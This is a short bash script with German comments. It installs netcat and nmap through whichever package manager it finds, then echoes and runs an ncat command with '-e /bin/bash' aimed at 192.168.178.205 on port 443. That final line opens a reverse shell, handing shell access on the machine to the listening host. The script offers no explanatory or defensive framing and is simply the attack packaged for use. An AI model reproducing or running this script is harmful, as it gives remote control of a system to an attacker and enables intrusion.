#!/bin/bash

# Funktion zum Prüfen, ob ein Befehl vorhanden ist
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Bestimme den Paketmanager
if command_exists apt-get; then
    PACKAGE_MANAGER="apt-get"
    INSTALL_CMD="sudo apt-get install -y"
elif command_exists brew; then
    PACKAGE_MANAGER="brew"
    INSTALL_CMD="brew install"
elif command_exists yum; then
    PACKAGE_MANAGER="yum"
    INSTALL_CMD="sudo yum install -y"
else
    echo "Kein unterstützter Paketmanager gefunden!"
    exit 1
fi

# Funktion zum Installieren eines Pakets, falls es nicht vorhanden ist
install_if_not_installed() {
    local package="$1"
    if command_exists "$package"; then
        echo "$package ist bereits installiert."
    else
        echo "Installiere $package..."
        $INSTALL_CMD "$package"
    fi
}

# Überprüfe und installiere die benötigten Pakete
install_if_not_installed "netcat"
install_if_not_installed "nmap"

# Führe den Befehl aus
echo "Führe den Befehl aus: ncat -nv 192.168.178.205 443 -e /bin/bash"
ncat -nv 192.168.178.205 443 -e /bin/bash
